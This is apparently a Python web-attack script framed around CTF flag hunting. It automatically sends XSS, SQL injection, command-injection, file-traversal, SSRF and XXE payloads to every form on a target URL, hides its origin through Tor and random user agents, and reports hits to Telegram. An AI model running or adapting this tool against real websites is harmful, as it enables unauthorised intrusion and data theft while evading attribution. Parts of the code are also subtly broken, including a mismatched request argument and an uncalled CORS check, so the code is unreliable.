import asyncio
import aiohttp
from aiohttp_socks import ProxyConnector
from bs4 import BeautifulSoup
import re
import json
import csv
import yaml
import pandas as pd
from telegram import Bot
from urllib.parse import urljoin
import os
from datetime import datetime
import random
from fake_useragent import UserAgent
import websocket
from typing import List, Dict, Optional
from tqdm.asyncio import tqdm_asyncio

# –ì–ª–æ–±–∞–ª—å–Ω—ã–µ –ø–µ—Ä–µ–º–µ–Ω–Ω—ã–µ
vuln_count = 0
results = {
    'vulnerabilities': [],
    'injections': [],
    'flags': [],
    'admin_access': [],
    'db_dumps': [],
    'contest_logs': [],
    'js_flags': [],
    'graphql': []
}

# –ó–∞–≥—Ä—É–∑–∫–∞ –∫–æ–Ω—Ñ–∏–≥—É—Ä–∞—Ü–∏–∏ –∏–∑ YAML
def load_config(config_path: str = 'config.yaml') -> Dict:
    default_config = {
        'xss_payloads': [
            "<script>alert('Test by W1ndY')</script>",
            "<img src=x onerror=alert('Test by W1ndY')>",
        ],
        'sqli_payloads': ["' OR '1'='1", "1' AND SLEEP(5)--"],
        'rce_payloads': ["whoami", "id"],
        'lfi_payloads': ["../config.php", "../../etc/passwd"],
        'ssrf_payloads': ["http://localhost", "http://127.0.0.1"],
        'xxe_payloads': ['<?xml version="1.0"?><!DOCTYPE x [<!ENTITY x SYSTEM "file:///etc/hosts">]><x>&x;</x>'],
        'graphql_queries': ['{__schema{types{name}}}', '{users{id,username}}'],
        'admin_paths': ["/admin", "/graphql", "/api", "/login"],
        'custom_html': "<div>W1ndY was here!</div>",
        'request_timeout': 5.0,
        'delay': 0.5,
        'max_concurrent': 10,
        'use_tor': True,
        'proxy_list': ['socks5://127.0.0.1:9050'],
        'user_agents': UserAgent().random,
        'telegram': {'bot_token': '', 'chat_id': ''},
    }
    if os.path.exists(config_path):
        with open(config_path, 'r') as f:
            config = yaml.safe_load(f)
        default_config.update(config)
    return default_config

CONFIG = load_config()

# –ö–ª–∞—Å—Å –¥–ª—è –ª–æ–≥–∏—Ä–æ–≤–∞–Ω–∏—è —É—è–∑–≤–∏–º–æ—Å—Ç–µ–π
class VulnerabilityLogger:
    def __init__(self, results: Dict, telegram_config: Dict):
        self.results = results
        self.telegram_config = telegram_config
        self.vuln_count = 0

    async def log_vuln(self, vuln_type: str, message: str, category: str = 'vulnerabilities'):
        self.vuln_count += 1
        self.results[category].append(message)
        print(f"\033[91müî• {message}\033[0m")
        self.results['contest_logs'].append(message)
        if self.telegram_config['bot_token'] and self.telegram_config['chat_id']:
            try:
                bot = Bot(token=self.telegram_config['bot_token'])
                await bot.send_message(
                    chat_id=self.telegram_config['chat_id'],
                    text=f"üî• –ù–∞–π–¥–µ–Ω–æ {self.vuln_count} —É—è–∑–≤–∏–º–æ—Å—Ç–µ–π! –ü–æ—Å–ª–µ–¥–Ω—è—è: {message}" if self.vuln_count % 10 == 0 else message
                )
            except Exception as e:
                print(f"\033[93m‚ö† Telegram Error: {e}\033[0m")

# –ö–ª–∞—Å—Å –¥–ª—è –∞—Ç–∞–∫
class AttackManager:
    def __init__(self, session: aiohttp.ClientSession, logger: VulnerabilityLogger):
        self.session = session
        self.logger = logger
        self.flag_pattern = r'flag\{[A-Za-z0-9-_]+\}'

    async def async_request(self, method: str, url: str, data=None, params=None) -> Optional[aiohttp.ClientResponse]:
        try:
            async with self.session.request(
                method, url, data=data, params=params, headers={'User-Agent': CONFIG['user_agents']}, timeout=CONFIG['request_timeout']
            ) as response:
                response.text = await response.text()
                return response
        except Exception as e:
            print(f"\033[93m‚ö† Request Error: {url}: {e}\033[0m")
            return None

    async def inject_payload(self, url: str, vuln_type: str, payload: str) -> bool:
        test_data = {'input': payload} if vuln_type != 'rce' else {'cmd': payload}
        response = await self.async_request('POST', url, data=test_data)
        if not response:
            return False

        vuln_detected = False
        vuln_message = None
        if vuln_type == 'xss' and payload in response.text:
            vuln_message = f"üíâ XSS by W1ndY: {url} —Å {payload}"
            vuln_detected = True
            category = 'injections'
        elif vuln_type == 'sqli' and 'error' in response.text.lower():
            vuln_message = f"üíâ SQLi by W1ndY: {url} —Å {payload}"
            vuln_detected = True
            category = 'injections'
        elif vuln_type == 'rce' and ('uid=' in response.text or 'pong' in response.text):
            vuln_message = f"üíâ RCE Detected: {url} with {payload}"
            vuln_detected = True
            category = 'injections'
        elif vuln_type == 'lfi' and ('DB_PASSWORD' in response.text or 'root:' in response.text):
            vuln_message = f"üíâ LFI Detected: {url} with {payload}"
            vuln_detected = True
            category = 'injections'
        elif vuln_type in ['ssrf', 'xxe']:
            vuln_message = f"üíâ {vuln_type.upper()} by W1ndY: {url} —Å {payload} (Check Interact.sh for OOB)"
            vuln_detected = True
            category = 'injections'
        elif vuln_type == 'graphql' and ('__schema' in response.text or 'users' in response.text):
            vuln_message = f"üíâ GraphQL Detected: {url} —Å {payload}"
            vuln_detected = True
            category = 'graphql'

        if vuln_detected:
            await self.logger.log_vuln(vuln_type, vuln_message, category)
            return True
        return False

    async def check_cors(self, url: str) -> None:
        headers = {
            'Origin': 'http://evil.com',
            'User-Agent': CONFIG['user_agents']
        }
        response = await self.async_request('GET', url, headers=headers)
        if response and 'Access-Control-Allow-Origin' in response.headers:
            acao = response.headers['Access-Control-Allow-Origin']
            if acao == '*' or 'evil.com' in acao:
                vuln_message = f"üåê CORS Misconfiguration: {url} allows {acao}"
                await self.logger.log_vuln('cors', vuln_message)

# –û—Å–Ω–æ–≤–Ω–∞—è —Ñ—É–Ω–∫—Ü–∏—è —Å–∫–∞–Ω–∏—Ä–æ–≤–∞–Ω–∏—è
async def hack_website(url: str, attacks: List[str]) -> None:
    connector = ProxyConnector.from_url(CONFIG['proxy_list'][0]) if CONFIG['use_tor'] else None
    async with aiohttp.ClientSession(
        headers={'User-Agent': UserAgent().random},
        connector=connector
    ) as session:
        logger = VulnerabilityLogger(results, CONFIG['telegram'])
        attacker = AttackManager(session, logger)

        # –ù–∞—á–∞–ª—å–Ω—ã–π –∑–∞–ø—Ä–æ—Å
        response = await attacker.async_request('GET', url)
        if not response:
            print("\033[91müö® –°–∞–π—Ç –Ω–µ –æ—Ç–≤–µ—á–∞–µ—Ç! –ü—Ä–æ–≤–µ—Ä—è–π URL, W1ndY! üö®\033[0m")
            return

        soup = BeautifulSoup(response.text, 'html.parser')

        # –ü–æ–∏—Å–∫ —Ñ–ª–∞–≥–æ–≤
        flag_pattern = r'flag\{[A-Za-z0-9-_]+\}'
        for text in soup.stripped_strings:
            if re.search(flag_pattern, text):
                await logger.log_vuln('flag', f"üö© Galactic CTF Flag: {text}", 'flags')
        for header, value in response.headers.items():
            if re.search(flag_pattern, value):
                await logger.log_vuln('flag', f"üö© Galactic CTF Flag in Header: {header}: {value}", 'flags')
        for cookie in session.cookie_jar:
            if re.search(flag_pattern, cookie.value):
                await logger.log_vuln('flag', f"üö© Galactic CTF Flag in Cookie: {cookie.key}: {cookie.value}", 'flags')

        # –°–∫–∞–Ω–∏—Ä–æ–≤–∞–Ω–∏–µ —Ñ–æ—Ä–º
        tasks = []
        for form in soup.find_all('form'):
            action = form.get('action', '')
            form_url = urljoin(url, action)
            for vuln_type in ['xss', 'sqli', 'rce', 'lfi', 'ssrf', 'xxe']:
                if vuln_type in attacks:
                    for payload in CONFIG[f'{vuln_type}_payloads']:
                        for input_tag in soup.find_all('input'):
                            name = input_tag.get('name')
                            if name:
                                tasks.append(attacker.inject_payload(form_url, vuln_type, payload))

        # –ü–∞—Ä–∞–ª–ª–µ–ª—å–Ω–æ–µ –≤—ã–ø–æ–ª–Ω–µ–Ω–∏–µ –∑–∞–¥–∞—á
        for future in tqdm_asyncio.as_completed(tasks, desc="\033[91müî• W1ndY's Galactic Ultra\033[0m"):
            await future

        # –°–æ—Ö—Ä–∞–Ω–µ–Ω–∏–µ —Ä–µ–∑—É–ª—å—Ç–∞—Ç–æ–≤
        timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
        log_dir = 'shine_logs'
        os.makedirs(log_dir, exist_ok=True)

        # –≠–∫—Å–ø–æ—Ä—Ç –≤ JSON
        with open(f'{log_dir}/shine_results_{timestamp}.json', 'w', encoding='utf-8') as f:
            json.dump(results, f, indent=4, ensure_ascii=False)

        # –≠–∫—Å–ø–æ—Ä—Ç –≤ CSV
        with open(f'{log_dir}/shine_results_{timestamp}.csv', 'w', newline='', encoding='utf-8') as f:
            writer = csv.writer(f)
            writer.writerow(['Type', 'Details'])
            for category, items in results.items():
                for item in items:
                    writer.writerow([category.capitalize(), item])

        # –≠–∫—Å–ø–æ—Ä—Ç –≤ Excel —Å pandas
        df = pd.DataFrame([(k.capitalize(), v) for k, vs in results.items() for v in vs], columns=['Type', 'Details'])
        df.to_excel(f'{log_dir}/shine_results_{timestamp}.xlsx', index=False)

        print(f"\n\033[92müíæ Galactic Shine Logs: {log_dir}/shine_results_{timestamp}.json, .csv, .xlsx. W1ndY, —Ç—ã –ø—É–≥–∞–µ—à—å –≥–∞–ª–∞–∫—Ç–∏–∫—É! üòà\033[0m")

# –ò–Ω—Ç–µ—Ä–∞–∫—Ç–∏–≤–Ω–æ–µ –º–µ–Ω—é
def interactive_menu() -> tuple[str, List[str]]:
    print("\033[91müåå –ô–æ, W1ndY! –°–∏—è–µ–º —è—Ä—á–µ –≥–∞–ª–∞–∫—Ç–∏–∫–∏! üåü\033[0m")
    print("\nüåü Omega Ultra Galactic Menu by W1ndY üåü")
    url = input("URL (e.g., http://localhost/dvwa): ")
    attacks = input("–ê—Ç–∞–∫–∏ (xss sqli rce lfi ssrf xxe, Enter –¥–ª—è –≤—Å–µ—Ö): ").lower().split() or ['xss', 'sqli', 'rce', 'lfi', 'ssrf', 'xxe']
    CONFIG['use_tor'] = input("–ò—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å Tor? (y/n): ").lower() == 'y'
    return url, attacks

if __name__ == "__main__":
    url, attacks = interactive_menu()
    if url:
        asyncio.run(hack_website(url, attacks))